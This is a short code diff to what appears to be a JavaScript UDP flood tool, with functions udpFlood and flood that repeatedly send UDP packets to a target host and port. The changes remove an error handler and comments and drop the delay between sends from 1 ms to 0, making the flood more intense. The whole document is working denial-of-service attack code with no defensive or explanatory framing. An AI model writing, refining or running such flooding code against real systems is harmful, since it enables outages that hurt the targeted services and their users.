@@ -34,7 +34,7 @@ async function udpFlood(target, duration, intensity = 100) {
 
     sockets.forEach(socket => {
       try {
-        if (socket && !socket.closed) { // Check if the socket exists and is not already closed
+        if (socket && !socket.closed) {
           socket.close();
         }
       } catch (err) {
@@ -56,29 +56,14 @@ async function flood(hostname, port, duration, socket) {
 
       socket.send(message, port, hostname, (err) => {
         if (err) {
-          // Only log the error, don't close the socket here as other sends might be pending
           console.error(`UDP send error: ${err}`);
         }
       });
 
-
-      socket.on('error', (err) => {
-        console.error(`Socket error: ${err}`);
-        try {
-          if (socket && !socket.closed) { // Check if the socket exists and is not already closed
-            socket.close();
-          }
-        } catch(closeErr) {
-          console.error(`Error closing socket after error: ${closeErr}`);
-        }
-      });
-
-
     } catch (error) {
       console.error(`Error creating or sending UDP packet: ${error}`);
     }
-    // Add a small delay to avoid excessive CPU usage. Adjust as needed.
-    await new Promise(resolve => setTimeout(resolve, 1));
+    await new Promise(resolve => setTimeout(resolve, 0));
   }
 }
 
